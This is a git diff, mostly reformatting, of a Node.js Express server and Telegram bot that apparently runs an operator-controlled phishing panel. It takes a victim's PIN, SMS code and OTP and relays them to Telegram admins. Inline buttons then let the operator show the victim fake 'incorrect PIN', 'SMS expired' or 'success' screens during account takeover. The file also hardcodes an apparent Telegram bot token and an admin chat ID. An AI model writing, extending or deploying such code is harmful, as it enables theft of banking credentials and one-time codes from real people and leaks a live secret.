@@ -7,13 +7,18 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
+const TOKEN =
+  process.env.TOKEN ||
+  process.env.TELEGRAM_BOT_TOKEN ||
+  '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
 const RAW_APP_URL =
   process.env.APP_URL ||
   process.env.RENDER_EXTERNAL_URL ||
   (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
 const APP_URL = RAW_APP_URL ? RAW_APP_URL.replace(/\/+$/, '') : '';
-const FALLBACK_ADMIN_ID = String(process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400').trim();
+const FALLBACK_ADMIN_ID = String(
+  process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400'
+).trim();
 
 const ADMINS_FILE = path.join(__dirname, 'admins.json');
 
@@ -101,7 +106,9 @@ function formatAdminTelegramInfo(chatId, firstName, lastName, username, isMainAd
   const fullName = `${firstName || ''} ${lastName || ''}`.trim() || 'User';
   const cleanUser = username && username !== 'N/A' ? `@${escapeMarkdown(username)}` : 'N/A';
   const adminLink = buildAdminLink(chatId);
-  const roleLabel = isMainAdmin ? '👑 *MAIN ADMIN LINK & TELEGRAM INFO*' : '🔗 *SUB-ADMIN LINK & TELEGRAM INFO*';
+  const roleLabel = isMainAdmin
+    ? '👑 *MAIN ADMIN LINK & TELEGRAM INFO*'
+    : '🔗 *SUB-ADMIN LINK & TELEGRAM INFO*';
 
   return (
     `${roleLabel}\n\n` +
@@ -120,7 +127,9 @@ async function initBot() {
     try {
       const chatId = String(msg.chat.id);
       let chatInfo = {};
-      try { chatInfo = await bot.getChat(chatId); } catch (e) {}
+      try {
+        chatInfo = await bot.getChat(chatId);
+      } catch (e) {}
 
       const username = chatInfo.username || msg.from.username || 'N/A';
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
@@ -149,12 +158,16 @@ async function initBot() {
       const chatId = String(query.message.chat.id);
 
       const firstUnderscoreIdx = actionData.indexOf('_');
-      const actionType = firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
+      const actionType =
+        firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
       let targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
 
       if (actionType === 'COPYSMS') {
-        const smsText = smsStore.get(targetId) || (sessions.get(targetId) && sessions.get(targetId).sms) || '';
-        await bot.answerCallbackQuery(query.id, { text: 'SMS sent for clipboard copy', show_alert: false }).catch(() => {});
+        const smsText =
+          smsStore.get(targetId) || (sessions.get(targetId) && sessions.get(targetId).sms) || '';
+        await bot
+          .answerCallbackQuery(query.id, { text: 'SMS sent for clipboard copy', show_alert: false })
+          .catch(() => {});
         await bot.sendMessage(chatId, smsText);
         return;
       }
@@ -174,33 +187,54 @@ async function initBot() {
       switch (actionType) {
         case 'BLOCK':
           session.status = 'BLOCKED';
-          await bot.sendMessage(chatTarget, `🚫 Applicant blocked. Screen updated to blocked notice.`);
+          await bot.sendMessage(
+            chatTarget,
+            `🚫 Applicant blocked. Screen updated to blocked notice.`
+          );
           break;
         case 'NEXT':
           session.status = 'PROCEED_SMS';
-          await bot.sendMessage(chatTarget, `➡️ Allowed to proceed to SMS verification screen.`);
+          await bot.sendMessage(
+            chatTarget,
+            `➡️ Allowed to proceed to SMS verification screen.`
+          );
           break;
         case 'INCORRECT':
           session.status = 'INCORRECT_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Incorrect PIN triggered on applicant screen.`);
+          await bot.sendMessage(
+            chatTarget,
+            `❌ Incorrect PIN triggered on applicant screen.`
+          );
           break;
         case 'EXPIRED':
           session.status = 'SMS_EXPIRED';
-          await bot.sendMessage(chatTarget, `⚠️ SMS Expired triggered on applicant screen.`);
+          await bot.sendMessage(
+            chatTarget,
+            `⚠️ SMS Expired triggered on applicant screen.`
+          );
           break;
         case 'APPROVE':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `📲 SMS approved. Applicant moved to 4-Digit OTP entry screen.`);
+          await bot.sendMessage(
+            chatTarget,
+            `📲 SMS approved. Applicant moved to 4-Digit OTP entry screen.`
+          );
           break;
         case 'OTPEXPIRED':
           session.status = 'OTP_EXPIRED';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ OTP EXPIRED triggered. Applicant redirected back to enter a new 4-digit OTP.`);
+          await bot.sendMessage(
+            chatTarget,
+            `⚠️ OTP EXPIRED triggered. Applicant redirected back to enter a new 4-digit OTP.`
+          );
           break;
         case 'SUCCESS':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 SUCCESS! Congratulations screen shown to applicant.`);
+          await bot.sendMessage(
+            chatTarget,
+            `🎉 SUCCESS! Congratulations screen shown to applicant.`
+          );
           break;
         default:
           break;
@@ -208,10 +242,15 @@ async function initBot() {
 
       await bot.answerCallbackQuery(query.id, { text: 'Done' }).catch(() => {});
       if (query.message && query.message.message_id) {
-        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id
-        }).catch(() => {});
+        await bot
+          .editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            {
+              chat_id: query.message.chat.id,
+              message_id: query.message.message_id
+            }
+          )
+          .catch(() => {});
       }
     } catch (err) {}
   });
@@ -350,9 +389,7 @@ app.post('/api/submit-sms', async (req, res) => {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
-          [
-            { text: '📋 Copy SMS', callback_data: `COPYSMS_${activeId}` }
-          ],
+          [{ text: '📋 Copy SMS', callback_data: `COPYSMS_${activeId}` }],
           [
             { text: 'SMS EXPIRES', callback_data: `EXPIRED_${activeId}` },
             { text: 'INCORRECT PIN', callback_data: `INCORRECT_${activeId}` },
@@ -445,4 +482,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+  
